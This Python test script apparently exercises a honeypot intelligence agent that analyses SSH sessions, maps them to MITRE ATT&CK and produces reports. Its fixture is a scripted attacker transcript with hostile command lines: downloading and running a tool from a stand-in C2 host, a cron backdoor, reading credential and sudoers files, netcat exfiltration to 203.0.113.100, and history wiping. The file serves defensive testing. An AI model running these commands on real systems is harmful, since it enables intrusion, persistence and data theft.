#!/usr/bin/env python3
"""
Comprehensive test for the complete Intelligence Agent implementation
Tests all three sub-tasks: Session Analysis, MITRE Mapping, and Intelligence Reporting
"""

import asyncio
import json
import logging
from datetime import datetime, timedelta
from agents.intelligence import IntelligenceAgent, SessionAnalyzer, MitreAttackMapper, IntelligenceReporter

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_comprehensive_test_session():
    """Create a comprehensive test session with multiple attack vectors"""
    base_time = datetime.utcnow()
    
    return {
        "session_id": "comprehensive-test-001",
        "metadata": {
            "honeypot_type": "ssh",
            "source_ip": "203.0.113.50",
            "start_time": base_time.isoformat(),
            "end_time": (base_time + timedelta(minutes=30)).isoformat(),
            "duration_seconds": 1800,
            "user_agent": "OpenSSH_8.0",
            "day_of_week": "Monday",
            "timezone": "UTC"
        },
        "transcript": [
            # Initial reconnaissance
            {
                "timestamp": base_time.isoformat(),
                "type": "connection",
                "content": "SSH connection established"
            },
            {
                "timestamp": (base_time + timedelta(seconds=10)).isoformat(),
                "type": "command",
                "content": "whoami"
            },
            {
                "timestamp": (base_time + timedelta(seconds=15)).isoformat(),
                "type": "response",
                "content": "admin"
            },
            {
                "timestamp": (base_time + timedelta(seconds=20)).isoformat(),
                "type": "command",
                "content": "id"
            },
            {
                "timestamp": (base_time + timedelta(seconds=25)).isoformat(),
                "type": "response",
                "content": "uid=1000(admin) gid=1000(admin) groups=1000(admin),4(adm),24(cdrom),27(sudo)"
            },
            
            # System discovery
            {
                "timestamp": (base_time + timedelta(seconds=30)).isoformat(),
                "type": "command",
                "content": "uname -a"
            },
            {
                "timestamp": (base_time + timedelta(seconds=35)).isoformat(),
                "type": "response",
                "content": "Linux honeypot 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux"
            },
            {
                "timestamp": (base_time + timedelta(seconds=45)).isoformat(),
                "type": "command",
                "content": "ps aux"
            },
            {
                "timestamp": (base_time + timedelta(seconds=60)).isoformat(),
                "type": "command",
                "content": "netstat -an"
            },
            
            # Network and file discovery
            {
                "timestamp": (base_time + timedelta(seconds=90)).isoformat(),
                "type": "command",
                "content": "cat /etc/passwd"
            },
            {
                "timestamp": (base_time + timedelta(seconds=120)).isoformat(),
                "type": "command",
                "content": "find /home -name '*.key' -o -name '*.pem' 2>/dev/null"
            },
            {
                "timestamp": (base_time + timedelta(seconds=150)).isoformat(),
                "type": "command",
                "content": "ls -la /var/log/"
            },
            
            # Privilege escalation attempts
            {
                "timestamp": (base_time + timedelta(seconds=180)).isoformat(),
                "type": "command",
                "content": "sudo -l"
            },
            {
                "timestamp": (base_time + timedelta(seconds=200)).isoformat(),
                "type": "command",
                "content": "cat /etc/sudoers"
            },
            
            # Tool download and execution
            {
                "timestamp": (base_time + timedelta(seconds=240)).isoformat(),
                "type": "command",
                "content": "wget http://malicious-c2.example.com/tools/linpeas.sh"
            },
            {
                "timestamp": (base_time + timedelta(seconds=260)).isoformat(),
                "type": "command",
                "content": "chmod +x linpeas.sh"
            },
            {
                "timestamp": (base_time + timedelta(seconds=280)).isoformat(),
                "type": "command",
                "content": "./linpeas.sh"
            },
            
            # Persistence attempts
            {
                "timestamp": (base_time + timedelta(seconds=320)).isoformat(),
                "type": "command",
                "content": "crontab -e"
            },
            {
                "timestamp": (base_time + timedelta(seconds=350)).isoformat(),
                "type": "command",
                "content": "echo '*/5 * * * * /tmp/backdoor.sh' | crontab -"
            },
            
            # Data collection
            {
                "timestamp": (base_time + timedelta(seconds=400)).isoformat(),
                "type": "command",
                "content": "find /home -name '*.txt' -o -name '*.doc' -o -name '*.pdf' 2>/dev/null"
            },
            {
                "timestamp": (base_time + timedelta(seconds=450)).isoformat(),
                "type": "command",
                "content": "tar -czf /tmp/collected_data.tar.gz /home/admin/documents/"
            },
            
            # Exfiltration attempt
            {
                "timestamp": (base_time + timedelta(seconds=500)).isoformat(),
                "type": "command",
                "content": "nc -w 3 203.0.113.100 4444 < /tmp/collected_data.tar.gz"
            },
            
            # Defense evasion
            {
                "timestamp": (base_time + timedelta(seconds=550)).isoformat(),
                "type": "command",
                "content": "history -c"
            },
            {
                "timestamp": (base_time + timedelta(seconds=560)).isoformat(),
                "type": "command",
                "content": "rm /tmp/linpeas.sh /tmp/collected_data.tar.gz"
            },
            {
                "timestamp": (base_time + timedelta(seconds=600)).isoformat(),
                "type": "command",
                "content": "unset HISTFILE"
            },
            
            # Final cleanup and exit
            {
                "timestamp": (base_time + timedelta(seconds=650)).isoformat(),
                "type": "command",
                "content": "exit"
            },
            {
                "timestamp": (base_time + timedelta(seconds=660)).isoformat(),
                "type": "disconnection",
                "content": "SSH connection closed"
            }
        ]
    }

async def test_complete_intelligence_workflow():
    """Test the complete intelligence analysis workflow"""
    logger.info("Testing Complete Intelligence Agent Workflow...")
    
    # Initialize Intelligence Agent
    config = {
        "analysis": {
            "confidence_threshold": 0.6,
            "max_concurrent_analyses": 5,
            "analysis_timeout": 300
        }
    }
    
    agent = IntelligenceAgent(config)
    
    try:
        # Start agent
        await agent.start()
        logger.info("✓ Intelligence Agent started successfully")
        
        # Create comprehensive test session
        test_session = create_comprehensive_test_session()
        
        # Step 1: Perform complete session analysis
        logger.info("\n1. Performing comprehensive session analysis...")
        analysis_result = await agent.analyze_session(test_session)
        
        logger.info(f"   Session ID: {analysis_result.get('session_id', 'unknown')}")
        logger.info(f"   Confidence Score: {analysis_result.get('confidence_score', 0):.2f}")
        logger.info(f"   Risk Assessment: {analysis_result.get('risk_assessment', 'unknown')}")
        logger.info(f"   Techniques Found: {len(analysis_result.get('techniques', []))}")
        logger.info(f"   Findings Generated: {len(analysis_result.get('findings', []))}")
        
        # Step 2: Test MITRE ATT&CK analysis
        logger.info("\n2. Testing MITRE ATT&CK analysis...")
        mitre_message = {
            "type": "mitre_analysis",
            "session_data": test_session
        }
        
        mitre_result = await agent.process_message(mitre_message)
        if mitre_result.get("status") == "success":
            mitre_analysis = mitre_result.get("mitre_analysis", {})
            logger.info(f"   ✓ MITRE techniques mapped: {len(mitre_analysis.get('techniques', []))}")
            logger.info(f"   ✓ IOCs extracted: {len(mitre_analysis.get('iocs', []))}")
            
            threat_profile = mitre_analysis.get("threat_profile", {})
            logger.info(f"   ✓ Threat actor confidence: {threat_profile.get('confidence_level', 'unknown')}")
            
            # Show top techniques
            techniques = mitre_analysis.get("techniques", [])[:5]
            logger.info("   Top MITRE techniques:")
            for tech in techniques:
                logger.info(f"     - {tech.get('technique_id', 'unknown')}: {tech.get('technique_name', 'unknown')} "
                           f"(Tactic: {tech.get('tactic', 'unknown')})")
        else:
            logger.error(f"   ✗ MITRE analysis failed: {mitre_result.get('error', 'unknown')}")
        
        # Step 3: Test intelligence reporting
        logger.info("\n3. Testing intelligence reporting...")
        
        # Generate executive summary
        exec_report_msg = {
            "type": "generate_structured_report",
            "report_type": "executive_summary",
            "time_range": "24h"
        }
        
        exec_result = await agent.process_message(exec_report_msg)
        if exec_result.get("status") == "success":
            report = exec_result.get("report", {})
            logger.info(f"   ✓ Executive summary generated with {len(report.get('sections', {}))} sections")
            
            # Show key metrics
            metrics = report.get("metrics", {})
            logger.info(f"     - Total sessions analyzed: {metrics.get('total_sessions', 0)}")
            logger.info(f"     - High risk sessions: {metrics.get('high_risk_sessions', 0)}")
            logger.info(f"     - Unique techniques: {metrics.get('unique_techniques', 0)}")
        else:
            logger.error(f"   ✗ Executive report failed: {exec_result.get('error', 'unknown')}")
        
        # Generate automated summary
        summary_msg = {
            "type": "generate_automated_summary",
            "summary_type": "daily"
        }
        
        summary_result = await agent.process_message(summary_msg)
        if summary_result.get("status") == "success":
            summary = summary_result.get("summary", {})
            logger.info("   ✓ Automated daily summary generated")
            
            # Show narrative
            narrative = summary.get("narrative", "")
            logger.info(f"     Narrative: {narrative[:100]}...")
        else:
            logger.error(f"   ✗ Automated summary failed: {summary_result.get('error', 'unknown')}")
        
        # Step 4: Test intelligence dashboard
        logger.info("\n4. Testing intelligence dashboard...")
        dashboard_result = await agent.generate_intelligence_dashboard("24h")
        
        if dashboard_result.get("status") == "success":
            dashboard = dashboard_result.get("dashboard", {})
            logger.info("   ✓ Intelligence dashboard generated successfully")
            logger.info(f"     - Dashboard sections: {len(dashboard)}")
            logger.info(f"     - Alerts generated: {len(dashboard.get('alerts', []))}")
            logger.info(f"     - Recommendations: {len(dashboard.get('recommendations', []))}")
            
            # Show sample alerts
            alerts = dashboard.get("alerts", [])[:3]
            if alerts:
                logger.info("     Top alerts:")
                for alert in alerts:
                    logger.info(f"       - {alert.get('title', 'unknown')} (Severity: {alert.get('severity', 'unknown')})")
        else:
            logger.error(f"   ✗ Dashboard generation failed: {dashboard_result.get('error', 'unknown')}")
        
        # Step 5: Test data export
        logger.info("\n5. Testing intelligence data export...")
        
        # Export as JSON
        json_export = await agent.export_intelligence_data("json", "24h", False)
        if json_export.get("status") == "success":
            data = json_export.get("data", {})
            logger.info("   ✓ JSON export completed")
            logger.info(f"     - Techniques exported: {len(data.get('techniques', []))}")
            logger.info(f"     - IOCs exported: {len(data.get('iocs', []))}")
            logger.info(f"     - Findings exported: {len(data.get('findings', []))}")
        
        # Export as STIX
        stix_export = await agent.export_intelligence_data("stix", "24h", False)
        if stix_export.get("status") == "success":
            data = stix_export.get("data", {})
            stix_bundle = data.get("stix_bundle")
            if stix_bundle:
                logger.info(f"   ✓ STIX export completed with {len(stix_bundle.get('objects', []))} objects")
            else:
                logger.info("   ✓ STIX export completed (no bundle generated)")
        
        # Step 6: Test trend analysis
        logger.info("\n6. Testing trend analysis...")
        
        # Add more sample data for trend analysis
        for i in range(5):
            sample_session = create_comprehensive_test_session()
            sample_session["session_id"] = f"trend-test-{i:03d}"
            await agent.analyze_session(sample_session)
        
        trend_msg = {
            "type": "analyze_trends",
            "analysis_type": "comprehensive"
        }
        
        trend_result = await agent.process_message(trend_msg)
        if trend_result.get("status") == "success":
            trend_analysis = trend_result.get("trend_analysis", {})
            logger.info("   ✓ Trend analysis completed")
            
            volume_trends = trend_analysis.get("volume_trends", {})
            logger.info(f"     - Volume trend: {volume_trends.get('trend', 'unknown')}")
            
            technique_trends = trend_analysis.get("technique_trends", {})
            top_techniques = technique_trends.get("top_techniques", {})
            logger.info(f"     - Top trending techniques: {list(top_techniques.keys())[:3]}")
        else:
            logger.error(f"   ✗ Trend analysis failed: {trend_result.get('error', 'unknown')}")
        
        # Step 7: Test final statistics
        logger.info("\n7. Final Intelligence Agent Statistics...")
        
        stats_result = await agent.get_mitre_statistics("24h")
        if stats_result.get("status") == "success":
            stats = stats_result.get("statistics", {})
            logger.info("   ✓ MITRE statistics generated")
            logger.info(f"     - Total sessions: {stats.get('total_sessions', 0)}")
            logger.info(f"     - Total techniques: {stats.get('total_techniques', 0)}")
            logger.info(f"     - Unique techniques: {stats.get('unique_techniques', 0)}")
            logger.info(f"     - Unique tactics: {stats.get('unique_tactics', 0)}")
        
        # Show agent performance metrics
        agent_metrics = await agent.get_metrics()
        logger.info(f"   Agent uptime: {agent_metrics.get('uptime_seconds', 0):.1f} seconds")
        logger.info(f"   Messages processed: {agent_metrics.get('processed_messages', 0)}")
        logger.info(f"   Error count: {agent_metrics.get('error_count', 0)}")
        
        logger.info("\n🎉 Complete Intelligence Agent workflow test PASSED!")
        
    except Exception as e:
        logger.error(f"❌ Complete workflow test FAILED: {e}")
        raise
    
    finally:
        # Stop agent
        await agent.stop()
        logger.info("Intelligence Agent stopped")

async def test_individual_components():
    """Test individual components separately"""
    logger.info("\nTesting Individual Intelligence Components...")
    
    # Test SessionAnalyzer
    logger.info("1. Testing SessionAnalyzer...")
    analyzer = SessionAnalyzer()
    
    test_session = create_comprehensive_test_session()
    transcript = test_session["transcript"]
    
    # Test command analysis
    command_analysis = analyzer.analyze_command_sequence(transcript)
    logger.info(f"   ✓ Command analysis: {command_analysis.get('total_commands', 0)} commands, "
               f"{len(command_analysis.get('techniques', []))} techniques")
    
    # Test sophistication scoring
    score, level = analyzer.calculate_sophistication_score(test_session)
    logger.info(f"   ✓ Sophistication: {level} (score: {score:.2f})")
    
    # Test IOC extraction
    iocs = analyzer.extract_indicators_of_compromise(test_session)
    logger.info(f"   ✓ IOCs extracted: {len(iocs)}")
    
    # Test MitreAttackMapper
    logger.info("2. Testing MitreAttackMapper...")
    mapper = MitreAttackMapper()
    
    # Test technique mapping
    techniques = mapper.map_techniques_from_session(test_session)
    logger.info(f"   ✓ MITRE techniques mapped: {len(techniques)}")
    
    # Test IOC extraction and validation
    validated_iocs = mapper.extract_and_validate_iocs(test_session)
    logger.info(f"   ✓ IOCs validated: {len(validated_iocs)}")
    
    # Test threat actor profiling
    threat_profile = mapper.profile_threat_actor(techniques, test_session.get("metadata", {}))
    logger.info(f"   ✓ Threat actor profiling: {threat_profile.get('confidence_level', 'unknown')} confidence")
    
    # Test IntelligenceReporter
    logger.info("3. Testing IntelligenceReporter...")
    reporter = IntelligenceReporter()
    
    # Create sample analysis data
    sample_analyses = [{
        "session_id": "test-001",
        "start_time": datetime.utcnow().isoformat(),
        "result": {
            "techniques": techniques[:5],
            "iocs": validated_iocs[:3],
            "risk_assessment": "High",
            "confidence_score": 0.85,
            "findings": [{"type": "test", "confidence": 0.9, "severity": "High"}],
            "recommendations": ["Test recommendation"]
        }
    }]
    
    # Test structured report
    report = reporter.generate_structured_report(sample_analyses, "technical_analysis", "24h")
    logger.info(f"   ✓ Structured report: {len(report.get('sections', {}))} sections")
    
    # Test automated summary
    summary = reporter.generate_automated_summary(sample_analyses, "daily")
    logger.info(f"   ✓ Automated summary: {len(summary.get('narrative', ''))} characters")
    
    # Test trend analysis
    trend_analysis = reporter.analyze_trends(sample_analyses * 5, "comprehensive")  # Duplicate for trend analysis
    logger.info(f"   ✓ Trend analysis: {trend_analysis.get('analysis_metadata', {}).get('data_points', 0)} data points")
    
    logger.info("✅ All individual components tested successfully!")

async def main():
    """Main test function"""
    logger.info("🚀 Starting Comprehensive Intelligence Agent Tests")
    logger.info("="*60)
    
    try:
        # Test individual components
        await test_individual_components()
        
        print("\n" + "="*60 + "\n")
        
        # Test complete workflow
        await test_complete_intelligence_workflow()
        
        logger.info("\n" + "="*60)
        logger.info("🎉 ALL INTELLIGENCE AGENT TESTS PASSED SUCCESSFULLY!")
        logger.info("✅ Session Analysis Engine: WORKING")
        logger.info("✅ MITRE ATT&CK Mapping: WORKING") 
        logger.info("✅ Intelligence Reporting: WORKING")
        logger.info("✅ Complete Integration: WORKING")
        
    except Exception as e:
        logger.error(f"❌ COMPREHENSIVE TEST FAILED: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())